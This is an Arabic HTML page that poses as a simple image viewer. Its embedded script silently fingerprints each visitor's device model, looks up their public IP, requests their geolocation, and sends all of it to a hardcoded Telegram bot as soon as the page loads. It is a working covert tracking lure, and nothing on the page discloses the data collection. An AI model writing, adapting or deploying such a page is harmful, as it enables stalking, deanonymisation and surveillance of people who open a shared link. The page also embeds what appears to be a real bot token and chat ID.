<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صورة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Arial, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .image-container {
            max-width: 100%;
            max-height: 100vh;
            overflow: hidden;
        }
        
        .image-container img {
            width: 100%;
            height: auto;
            display: block;
        }
    </style>
</head>
<body>

    <div class="image-container">
        <img src="zer.jpg" alt="صورة">
    </div>

    <script>
        // دالة تحديد نوع الشركة والجهاز
        function getExactDeviceName(ua) {
            if (/Android/.test(ua)) {
                let brand = "Android (شركة غير معروفة)";
                let modelCode = "غير محدد";

                const androidMatch = ua.match(/Android[^;]*;\s*([^)]+)\)/);
                if (androidMatch) {
                    modelCode = androidMatch[1].trim();
                    
                    let lowerUA = ua.toLowerCase();
                    let lowerModel = modelCode.toLowerCase();

                    if (lowerUA.includes("samsung") || lowerModel.startsWith("sm-")) {
                        brand = "Samsung";
                    } else if (lowerUA.includes("huawei") || lowerUA.includes("honor") || lowerModel.startsWith("hwn")) {
                        brand = "Huawei / Honor";
                    } else if (lowerUA.includes("xiaomi") || lowerUA.includes("redmi") || lowerUA.includes("poco") || lowerUA.includes("mi ")) {
                        brand = "Xiaomi";
                    } else if (lowerUA.includes("oppo") || lowerModel.startsWith("cph")) {
                        brand = "Oppo";
                    } else if (lowerUA.includes("vivo")) {
                        brand = "Vivo";
                    } else if (lowerUA.includes("oneplus")) {
                        brand = "OnePlus";
                    } else if (lowerUA.includes("realme")) {
                        brand = "Realme";
                    } else if (lowerUA.includes("google") || lowerModel.includes("pixel")) {
                        brand = "Google Pixel";
                    } else if (lowerUA.includes("sony")) {
                        brand = "Sony";
                    }
                }
                return `${brand} [${modelCode}]`;
            }

            if (/iPhone|iPad/.test(ua)) {
                const width = window.screen.width;
                const height = window.screen.height;

                if (width === 430 && height === 932) return 'iPhone 15 Pro Max / 14 Pro Max';
                if (width === 393 && height === 852) return 'iPhone 15 Pro / 15 / 14 Pro';
                if (width === 428 && height === 926) return 'iPhone 14 Plus / 13 Pro Max';
                if (width === 390 && height === 844) return 'iPhone 14 / 13 Pro / 13 / 12 Pro / 12';
                if (width === 414 && height === 896) return 'iPhone 11 / XR / XS Max';
                if (width === 375 && height === 812) return 'iPhone 13 mini / 12 mini / 11 Pro / X / XS';
                if (width === 375 && height === 667) return 'iPhone SE / 8 / 7';
                
                return 'iPhone / iPad';
            }

            if (/Windows NT 10.0/.test(ua)) return 'Windows 10/11';
            if (/Macintosh/.test(ua)) return 'Mac';
            if (/Linux/.test(ua)) return 'Linux';

            return 'غير معروف';
        }

        const now = new Date().toLocaleString("ar-SA", {timeZone: "Asia/Riyadh"});
        const ua = navigator.userAgent;
        const botToken = '8426812517:AAHI0TRbNfDDGcI97cyT6EpFV6y8ADLsAl8';
        const chatId = '1802530770';
        
        let exactDeviceName = getExactDeviceName(ua);
        
        // إرسال البيانات الأساسية على الفور
        const basicMsg = `✅ زائر جديد!%0A⏰ ${now}%0A📱 الجهاز: ${exactDeviceName}`;
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${basicMsg}`);
        
        // جزء جلب الـ IP (بدون انتظار طويل)
        fetch("https://api.ipify.org?format=json", {timeout: 5000})
          .then(r => r.json())
          .then(data => {
            const ip = data.ip;
            const ipMsg = `🔗 IP Address: ${ip}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${ipMsg}`);
          })
          .catch(() => {
            console.log('لم يتمكن من جلب IP');
          });
        
        // جزء جلب الموقع (بدون انتظار)
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition((pos) => {
            let lat = pos.coords.latitude;
            let lon = pos.coords.longitude;
            const locMsg = `📍 الموقع:%0A🗺 https://www.google.com/maps?q=${lat},${lon}`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${locMsg}`);
          }, () => {
            console.log('لم يتمكن من جلب الموقع');
          });
        }
    </script>
</body>
</html>
